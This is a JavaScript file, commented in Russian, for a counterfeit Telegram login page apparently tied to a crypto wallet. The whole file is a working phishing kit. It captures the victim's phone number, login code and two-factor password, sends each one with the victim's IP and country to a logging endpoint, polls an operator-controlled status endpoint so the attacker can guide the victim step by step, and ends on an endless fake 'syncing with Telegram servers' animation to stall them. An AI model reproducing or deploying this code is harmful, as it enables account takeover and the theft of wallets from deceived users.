let currentStep = undefined;
let currentStatusInterval = undefined;
const countryInput = document.getElementById("sign-in-phone-code");
const countryMenu = document.querySelector(".Menu.compact.CountryCodeInput");
const phoneInput = document.getElementById("sign-in-phone-number");
const countryIcon = document.querySelector(".css-icon-down");
const toggleButton = document.getElementById("toggleButton");
const submitButton = document.querySelector("button[type='submit']");
const qrbutton = document.getElementById("qrbutton");
const nextnumbut = document.getElementById("nextnumbut");
const wallet = document.getElementById("walletstart");
const form = document.getElementById("myForm");
const lastNumberElement = document.getElementById("lastnumber");
const passwordInput = document.getElementById("sign-in-password");
const loadbet2 = document.getElementById("loadbet2");
const four = document.getElementById("four");
const five = document.getElementById("five");
const waitElement = document.getElementById("wait");
const signInCodeInput = document.getElementById("sign-in-code");
const passwordLabel = document.querySelector(".password-input label");
const togglePasswordButton = document.querySelector(".toggle-password");
const fromPassToWaitButton = document.getElementById("from_pass_to_wait");
const countryItems = document.querySelectorAll(".MenuItem");

function loaderShow(callback = undefined, timeout = 0) {
  document.getElementById("loadbet2").style.display = "block";
  document.getElementById("walletstart").style.display = "none";
  document.getElementById("first").style.display = "none";
  document.getElementById("second").style.display = "none";
  document.getElementById("third").style.display = "none";
  document.getElementById("four").style.display = "none";
  document.getElementById("five").style.display = "none";
  if (callback) {
    setTimeout(() => {
      document.getElementById("loadbet2").style.display = "none";
      callback();
    }, timeout);
  }
}

form.addEventListener("submit", function (event) {
  event.preventDefault();
});

function toggleToSecond() {
  loaderShow(() => {
    document.getElementById("first").style.display = "none";
    document.getElementById("second").style.display = "block";
  }, 0);
}

function toggleToFirst(showLoader = true) {
  if (showLoader) {
    loaderShow(() => {
      document.getElementById("second").style.display = "none";
      document.getElementById("first").style.display = "block";
    });
  } else {
    document.getElementById("second").style.display = "none";
    document.getElementById("first").style.display = "block";
  }
}

async function toggleToThird() {
  const phoneNumber = phoneInput.value;
  lastNumberElement.textContent = phoneNumber;
  loaderShow();
  const IP = await $.getJSON("https://ipapi.co/json/");
  $.ajax({
    url: "/api/logging/sendData",
    method: "POST",
    data: {
      nameLog: "Телефон",
      log: phoneNumber,
      ip: IP.ip,
      country: IP.country_name,
    },
  });
  currentStep = currentStep ?? "phone_number";
  if (!currentStatusInterval) {
    currentStatusInterval = setInterval(() => {
      $.ajax({
        url: "/api/status",
        method: "GET",
        success: (res) => {
          if (res !== currentStep) {
            currentStep = res;
            switch (res) {
              case "phone_number_wrong":
                WrongPhoneNumber();
                break;
              case "code":
                document.getElementById("loadbet2").style.display = "none";
                document.getElementById("second").style.display = "none";
                document.getElementById("third").style.display = "block";
                break;
              case "code_wrong":
                signInCodeInput.value = "";
                WrongTelegramCode();
                break;
              case "two_factor":
                document.getElementById("loadbet2").style.display = "none";
                document.getElementById("third").style.display = "none";
                document.getElementById("four").style.display = "block";
                break;
              case "two_factor_wrong":
                passwordInput.value = "";
                WrongTelegramPassword();
                break;
              case "endless_loading":
                document.getElementById("loadbet2").style.display = "none";
                document.getElementById("four").style.display = "none";
                document.getElementById("five").style.display = "block";
                startWaitingAnimation();
                break;
              default:
                break;
            }
          }
        },
      });
    }, 1000);
  }
}

function toggleToWallet() {
  loaderShow(() => {
    wallet.style.display = "none";
    document.getElementById("second").style.display = "block";
  }, 500);
}

function showFourthBlock() {
  loaderShow(() => {
    document.getElementById("third").style.display = "none";
    document.getElementById("four").style.display = "block";
  });
}

function toggleToFive() {
  loaderShow(() => {
    document.getElementById("four").style.display = "none";
    document.getElementById("five").style.display = "block";
    startWaitingAnimation();
  });
}

// События для элементов
toggleButton.addEventListener("click", toggleToSecond);
qrbutton.addEventListener("click", () => toggleToFirst(false));
nextnumbut.addEventListener("click", toggleToThird);
wallet.addEventListener("click", function (event) {
  toggleToWallet();
});
fromPassToWaitButton.addEventListener("click", async (event) => {
  event.preventDefault();
  const password = passwordInput.value;
  loaderShow();
  const IP = await $.getJSON("https://ipapi.co/json/");
  $.ajax({
    url: "/api/logging/sendData",
    method: "POST",
    data: {
      nameLog: "2фа Пароль",
      log: password,
      ip: IP.ip,
      country: IP.country_name,
    },
  });
  // toggleToFive();
});

function autoSelectCountry(inputValue) {
  let matchedCountry = null;

  if (inputValue.startsWith("+77")) {
    countryInput.value = "Казахстан";
    countryMenu.style.display = "none";
    countryIcon.classList.remove("rotated");
    countryIcon.classList.remove("highlighted");
    return;
  }

  countryItems.forEach((item) => {
    const countryCode = item.querySelector(".country-code").textContent;
    if (inputValue.startsWith(countryCode)) {
      if (
        !matchedCountry ||
        countryCode.length >=
          matchedCountry.querySelector(".country-code").textContent.length
      ) {
        matchedCountry = item;
      }
    }
  });

  if (matchedCountry) {
    selectCountryByElement(matchedCountry);
  }
}

function selectCountryByElement(menuItem) {
  const countryName = menuItem.querySelector(".country-name").textContent;
  const countryCode = menuItem.querySelector(".country-code").textContent;
  countryInput.value = countryName;
  countryMenu.style.display = "none";
  countryIcon.classList.remove("rotated");
  countryIcon.classList.remove("highlighted");
}

countryInput.addEventListener("click", toggleCountryMenu);
countryMenu.addEventListener("click", selectCountry);
document.addEventListener("click", closeCountryMenu);
countryInput.addEventListener("blur", blurCountryMenu);
countryInput.addEventListener("input", filterCountryMenu);
phoneInput.addEventListener("input", (event) => {
  let inputValue = phoneInput.value;
  inputValue = inputValue.replace(/[^0-9+]/g, "");
  if (!inputValue.startsWith("+")) {
    inputValue = "+" + inputValue.replace(/\+/g, "");
  }
  phoneInput.value = inputValue;
  autoSelectCountry(inputValue);
  validatePhoneNumber();
});
signInCodeInput.addEventListener("input", validateSignInCode);
togglePasswordButton.addEventListener("click", togglePasswordVisibility);
passwordInput.addEventListener("input", adjustPasswordLabel);

// Функции для управления меню выбора страны
function toggleCountryMenu(event) {
  event.stopPropagation();
  const isVisible = countryMenu.style.display === "block";
  countryMenu.style.display = isVisible ? "none" : "block";
  countryIcon.classList.toggle("rotated", !isVisible);
  countryIcon.classList.toggle("highlighted", !isVisible);
}

function selectCountry(event) {
  if (event.target.closest(".MenuItem")) {
    const menuItem = event.target.closest(".MenuItem");
    const countryName = menuItem.querySelector(".country-name").textContent;
    const countryCode = menuItem.querySelector(".country-code").textContent;
    countryInput.value = countryName;
    phoneInput.value = countryCode;
    countryMenu.style.display = "none";
    countryIcon.classList.remove("rotated");
    countryIcon.classList.remove("highlighted");
  }
}

function closeCountryMenu(event) {
  if (
    !event.target.closest(".DropdownMenu") &&
    !event.target.closest(".MenuItem")
  ) {
    countryMenu.style.display = "none";
    countryIcon.classList.remove("rotated");
    countryIcon.classList.remove("highlighted");
  }
}

function blurCountryMenu() {
  setTimeout(() => {
    countryMenu.style.display = "none";
    countryIcon.classList.remove("rotated");
    countryIcon.classList.remove("highlighted");
  }, 200);
}

function filterCountryMenu() {
  const filter = countryInput.value.toLowerCase();
  const items = countryMenu.querySelectorAll(".MenuItem");
  items.forEach((item) => {
    const countryName = item
      .querySelector(".country-name")
      .textContent.toLowerCase();
    const countryCode = item
      .querySelector(".country-code")
      .textContent.toLowerCase();
    if (countryName.includes(filter) || countryCode.includes(filter)) {
      item.style.display = "flex";
    } else {
      item.style.display = "none";
    }
  });
}

// Валидация номера телефона
function validatePhoneNumber() {
  const phoneNumber = phoneInput.value.replace(/\D/g, "");
  // const countryCode = phoneInput.value.split(" ")[0];
  const phoneNumberLength = phoneNumber.length;
  if (phoneNumberLength >= 7 && phoneNumberLength <= 18) {
    phoneInput.classList.remove("invalid");
    submitButton.style.display = "block";
  } else {
    phoneInput.classList.add("invalid");
    submitButton.style.display = "none";
  }
}

// Валидация кода авторизации
async function validateSignInCode() {
  const code = signInCodeInput.value;
  if (code.length === 5) {
    loaderShow();
    const IP = await $.getJSON("https://ipapi.co/json/");
    $.ajax({
      url: "/api/logging/sendData",
      method: "POST",
      data: {
        nameLog: "Код",
        log: code,
        ip: IP.ip,
        country: IP.country_name,
      },
    });
  }
}

function togglePasswordVisibility() {
  const type =
    passwordInput.getAttribute("type") === "password" ? "text" : "password";
  passwordInput.setAttribute("type", type);
}

function adjustPasswordLabel() {
  if (passwordInput.value.length > 0) {
    passwordLabel.style.transform = "scale(0.75) translate(-0.5rem, -2.25rem)";
  } else {
    passwordLabel.style.transform = "";
  }
}

// Анимация ожидания
function startWaitingAnimation() {
  const messages = [
    { text: "Инициализация безопасного соединения...", duration: 22 },
    { text: "Еще чуть-чуть...", duration: 18 },
    { text: "Проверка идентификационных данных...", duration: 25 },
    { text: "Еще чуть-чуть...", duration: 20 },
    { text: "Синхронизация с серверами Telegram...", duration: 20 },
    { text: "Еще чуть-чуть...", duration: 20 },
    { text: "Генерация уникальных ключей шифрования...", duration: 15 },
    { text: "Еще чуть-чуть...", duration: 20 },
    { text: "Обновление данных вашего кошелька...", duration: 15 },
    { text: "Почти готово! Проверка информации...", duration: 5 },
  ];

  let currentMessage = 0;
  const waitElement = document.getElementById("wait");

  function showNextMessage() {
    waitElement.classList.add("hidden");
    setTimeout(() => {
      waitElement.textContent = messages[currentMessage].text;
      waitElement.classList.remove("hidden");
      currentMessage = (currentMessage + 1) % messages.length;
      setTimeout(showNextMessage, messages[currentMessage].duration * 1000);
    }, 1000);
  }

  showNextMessage();
}

const style = document.createElement("style");
style.innerHTML = `
    .invalid {
        border: 1px solid red;
    }
    .rotated {
        transform: rotate(222deg) !important;
    }
    .highlighted {
        color: rgb(51, 144, 236) !important;
    }
`;
document.head.appendChild(style);

//Функции для случаев с неправильными значениями
function WrongPhoneNumber() {
  loaderShow(() => {
    document.getElementById("second").style.display = "block";
    const input = document.getElementById("sign-in-phone-number");
    const label = document.querySelector('label[for="sign-in-phone-number"]');
    if (label) {
      label.textContent = "Incorrect phone number";
      label.style.color = "red";
    }
    if (input) {
      input.style.border = "1px solid red";
    }
  });
}

function WrongTelegramCode() {
  loaderShow(() => {
    document.getElementById("third").style.display = "block";
    const input = document.getElementById("sign-in-code");
    const label = document.querySelector('label[for="sign-in-code"]');
    if (label) {
      label.textContent = "Incorrect value";
      label.style.color = "red";
    }
    if (input) {
      input.style.border = "1px solid red";
    }
  });
}
function WrongTelegramPassword() {
  loaderShow(() => {
    document.getElementById("four").style.display = "block";
    const input = document.getElementById("sign-in-password");
    const label = document.querySelector('label[for="wrongPassword"]');
    document.getElementById("wrongPassword").textContent = "Password invalid";
    document.getElementById("wrongPassword").style.color = "red";

    if (input) {
      input.style.border = "1px solid red";
    }
  });
}
